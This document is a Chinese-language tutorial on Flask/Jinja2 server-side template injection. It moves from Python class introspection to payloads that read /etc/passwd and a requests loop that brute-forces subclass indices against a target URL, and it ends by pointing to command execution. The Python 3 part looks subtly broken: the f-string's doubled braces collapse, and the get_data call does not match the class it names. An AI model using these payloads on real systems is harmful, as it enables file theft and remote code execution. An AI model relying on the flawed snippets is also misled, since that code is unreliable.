# Flask-Jinja2 SSTI 一般利用方法

## SSTI 中常用的魔术方法
对于刚开始接触SSTI的新手来说，可能会对如何进行利用感到困惑。下面将详细解释Python中与类相关的一些知识。

面向对象编程的核心在于类，而Python提供了许多内置的函数库，我们经常通过`import`语句来引入这些类和方法。在Python中，字符串（str）、字典（dict）、元组（tuple）以及列表（list）等基本数据结构都继承自一个共同的基类：**object**。该基类拥有众多子类，并且每个类实例也具备一些特定属性和方法，如`__class__`、`__bases__`等，这些在SSTI攻击中扮演着重要角色。

- `__class__`：此属性用于显示变量所属的具体类型或类。
  ```python
  >>> ''.__class__
  <class 'str'>
  >>> ().__class__
  <class 'tuple'>
  >>> [].__class__
  <class 'list'>
  >>> {}.__class__
  <class 'dict'>
  ```

- `__bases__`：返回给定类的所有直接父类组成的元组。
  ```python
  >>> ().__class__.__bases__
  (<class 'object'>,)
  >>> ''.__class__.__bases__
  (<class 'object'>,)
  >>> [].__class__.__bases__
  (<class 'object'>,)
  >>> {}.__class__.__bases__
  (<class 'object'>,)
  ```

- `__mro__`：展示了一个类及其所有祖先类按照解析顺序排列的元组。
  ```python
  >>> ''.__class__.__mro__
  (<class 'str'>, <class 'object'>)
  >>> [].__class__.__mro__
  (<class 'list'>, <class 'object'>)
  >>> {}.__class__.__mro__
  (<class 'dict'>, <class 'object'>)
  >>> ().__class__.__mro__
  (<class 'tuple'>, <class 'object'>)
  ```

- `__subclasses__()`：列出指定类的所有直接子类。
  ```python
  >>> [].__class__.__bases__[0].__subclasses__()
  [<class 'type'>, ...]
  ```

### 利用 SSTI 读取文件

#### Python 2
可以通过遍历`object`类的子类找到编号为40的`file`类来进行文件读取：
```jinja
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
```

#### Python 3
由于`file`类在Python 3中已被移除，可以改用其他类例如`_io.TextIOWrapper`实现相同功能。首先需要确定该类的确切位置：
```python
import requests
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
for i in range(500):
    url = f"http://target/?name={{().__class__.__bases__[0].__subclasses__()[{i}]}}"
    res = requests.get(url=url, headers=headers)
    if '_io.TextIOWrapper' in res.text:
        print(i)
# 假设找到的是索引号79，则payload如下：
{{().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")}}
```

### 利用 SSTI 执行命令
要执行系统命令，通常需要寻找包含`eval`函数或`os`模块的方法。这同样涉及遍历合适的子类以找到具有此类功能的对象。具体步骤类似上述文件读取过程，但目标是定位并调用能够运行外部命令的功能。

总之，通过理解和运用Python中的类层次结构及特殊方法，可以在Flask-Jinja2环境中实施有效的SSTI攻击，进而达到读取敏感信息或远程代码执行的目的。